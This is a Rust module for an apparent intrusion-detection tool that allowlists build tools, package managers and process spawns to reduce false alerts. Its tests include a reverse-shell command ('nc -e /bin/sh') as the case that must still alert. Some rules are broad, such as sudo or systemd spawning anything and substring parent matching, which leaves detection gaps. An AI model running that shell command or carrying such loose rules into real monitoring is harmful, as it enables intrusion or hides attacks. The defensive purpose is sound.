//! Developer tool allowlist to reduce false positives.
//!
//! This is a best-effort suppression mechanism for known-benign tooling and
//! workflows (build systems, compilers, package managers). It should be used
//! conservatively and kept narrow to avoid creating detection blind spots.

use glob::Pattern;
use std::path::Path;

/// Allowlisted process paths (glob patterns).
const ALLOWLISTED_PROCESSES: &[&str] = &[
    // Rust toolchain
    "/home/*/.cargo/bin/*",
    "/home/*/.rustup/toolchains/*",
    "/usr/bin/cargo",
    "/usr/bin/rustc",
    "/usr/bin/rustup",
    // C/C++ toolchain
    "/usr/bin/gcc*",
    "/usr/bin/g++*",
    "/usr/bin/clang*",
    "/usr/bin/cc",
    "/usr/bin/c++",
    "/usr/bin/make",
    "/usr/bin/cmake",
    "/usr/bin/ninja",
    "/usr/bin/ld",
    "/usr/bin/as",
    // Node.js
    "/usr/bin/node",
    "/usr/bin/nodejs",
    "/usr/bin/npm",
    "/usr/bin/npx",
    "/usr/bin/yarn",
    "/home/*/.nvm/*",
    "/home/*/node_modules/.bin/*",
    // Python
    "/usr/bin/python",
    "/usr/bin/python3",
    "/usr/bin/pip",
    "/usr/bin/pip3",
    "/home/*/.local/bin/pip*",
    "/home/*/venv/bin/*",
    "/home/*/.virtualenvs/*",
    // Version control
    "/usr/bin/git",
    "/usr/bin/git-*",
    "/usr/bin/svn",
    "/usr/bin/hg",
    // Containers
    "/usr/bin/docker",
    "/usr/bin/podman",
    "/usr/bin/kubectl",
    "/usr/bin/helm",
    // IDEs and editors
    "/usr/bin/code",
    "/usr/bin/vim",
    "/usr/bin/nvim",
    "/usr/bin/emacs",
    "/opt/*/bin/*",
];

/// Allowlisted parent-child relationships (best-effort names).
const ALLOWLISTED_SPAWNS: &[(&str, &str)] = &[
    // Rust toolchain
    ("cargo", "rustc"),
    ("cargo", "rustdoc"),
    ("cargo", "rustfmt"),
    ("cargo", "clippy-driver"),
    // Make spawning compilers
    ("make", "gcc"),
    ("make", "g++"),
    ("make", "clang"),
    ("make", "cc"),
    // CMake spawning build tools
    ("cmake", "make"),
    ("cmake", "ninja"),
    ("cmake", "gcc"),
    // Node package managers
    ("npm", "node"),
    ("npx", "node"),
    ("yarn", "node"),
    // Git operations
    ("git", "ssh"),
    ("git", "git-remote-https"),
    ("git", "git-credential-*"),
    // SSH spawning shells (legitimate remote sessions)
    ("sshd", "bash"),
    ("sshd", "zsh"),
    ("sshd", "sh"),
    // Sudo spawning commands
    ("sudo", "*"),
    // Systemd spawning services
    ("systemd", "*"),
];

/// Allowlisted command patterns (simple glob-like prefixes with `*` at end).
const ALLOWLISTED_COMMANDS: &[&str] = &[
    // Package management
    "apt install*",
    "apt update*",
    "apt upgrade*",
    "apt-get install*",
    "dpkg -i*",
    // Rust / Cargo operations
    "cargo build*",
    "cargo test*",
    "cargo run*",
    "cargo install*",
    "cargo clippy*",
    "cargo fmt*",
    "rustup update*",
    // Git operations
    "git clone*",
    "git pull*",
    "git push*",
    "git fetch*",
    "git checkout*",
    // Docker operations
    "docker build*",
    "docker run*",
    "docker pull*",
    "docker-compose*",
];

#[derive(Debug, Clone)]
pub struct Allowlist {
    process_patterns: Vec<Pattern>,
    spawn_rules: Vec<(String, String)>,
    command_patterns: Vec<String>,
}

impl Allowlist {
    pub fn new() -> Self {
        let process_patterns = ALLOWLISTED_PROCESSES
            .iter()
            .filter_map(|p| Pattern::new(p).ok())
            .collect();

        let spawn_rules = ALLOWLISTED_SPAWNS
            .iter()
            .map(|(p, c)| (p.to_string(), c.to_string()))
            .collect();

        let command_patterns = ALLOWLISTED_COMMANDS.iter().map(|s| s.to_string()).collect();

        Self {
            process_patterns,
            spawn_rules,
            command_patterns,
        }
    }

    pub fn is_process_allowed(&self, path: &Path) -> bool {
        let path_str = path.to_string_lossy();
        self.process_patterns.iter().any(|p| p.matches(&path_str))
    }

    pub fn is_spawn_allowed(&self, parent: &str, child: &str) -> bool {
        for (allowed_parent, allowed_child) in &self.spawn_rules {
            if !matches_spawn_side(allowed_parent, parent, true) {
                continue;
            }

            if allowed_child == "*" {
                return true;
            }

            if matches_spawn_side(allowed_child, child, false) {
                return true;
            }
        }
        false
    }

    pub fn is_command_allowed(&self, cmdline: &str) -> bool {
        self.command_patterns
            .iter()
            .any(|pattern| glob_match_command(pattern, cmdline))
    }

    /// Should this event be suppressed from alerting?
    pub fn should_suppress(
        &self,
        process_path: Option<&Path>,
        parent_name: Option<&str>,
        process_name: &str,
        cmdline: &str,
    ) -> bool {
        if let Some(path) = process_path {
            if self.is_process_allowed(path) {
                return true;
            }
        }

        if let Some(parent) = parent_name {
            if self.is_spawn_allowed(parent, process_name) {
                return true;
            }
        }

        if self.is_command_allowed(cmdline) {
            return true;
        }

        false
    }
}

impl Default for Allowlist {
    fn default() -> Self {
        Self::new()
    }
}

fn matches_spawn_side(pattern: &str, value: &str, allow_contains: bool) -> bool {
    if pattern == "*" {
        return true;
    }

    if pattern.contains('*') {
        return Pattern::new(pattern)
            .map(|p| p.matches(value))
            .unwrap_or(false);
    }

    if allow_contains {
        value.contains(pattern)
    } else {
        value == pattern || value.ends_with(pattern) || value.contains(pattern)
    }
}

fn glob_match_command(pattern: &str, cmdline: &str) -> bool {
    if let Some(prefix) = pattern.strip_suffix('*') {
        return cmdline.starts_with(prefix);
    }

    pattern == cmdline
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cargo_allowlisted() {
        let allowlist = Allowlist::new();
        assert!(allowlist.is_process_allowed(Path::new("/home/user/.cargo/bin/cargo")));
        assert!(allowlist.is_process_allowed(Path::new("/usr/bin/cargo")));
        assert!(allowlist.is_process_allowed(Path::new(
            "/home/user/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/bin/rustc"
        )));
    }

    #[test]
    fn test_spawn_allowlist() {
        let allowlist = Allowlist::new();
        assert!(allowlist.is_spawn_allowed("cargo", "rustc"));
        assert!(allowlist.is_spawn_allowed("make", "gcc"));
        assert!(allowlist.is_spawn_allowed("sshd", "bash"));
        assert!(allowlist.is_spawn_allowed("sudo", "bash"));

        assert!(!allowlist.is_spawn_allowed("nginx", "bash"));
        assert!(!allowlist.is_spawn_allowed("apache2", "nc"));
    }

    #[test]
    fn test_command_allowlist() {
        let allowlist = Allowlist::new();
        assert!(allowlist.is_command_allowed("cargo build --release"));
        assert!(allowlist.is_command_allowed("git clone https://github.com/foo/bar"));
        assert!(allowlist.is_command_allowed("docker build -t myimage ."));
        assert!(!allowlist.is_command_allowed("nc -e /bin/sh 10.0.0.1 4444"));
    }

    #[test]
    fn test_full_suppression_check() {
        let allowlist = Allowlist::new();
        assert!(allowlist.should_suppress(
            Some(Path::new("/home/user/.cargo/bin/cargo")),
            Some("cargo"),
            "rustc",
            "rustc --edition 2021 src/main.rs",
        ));

        assert!(!allowlist.should_suppress(
            Some(Path::new("/usr/sbin/apache2")),
            Some("apache2"),
            "nc",
            "nc -e /bin/sh 10.0.0.1 4444",
        ));
    }
}
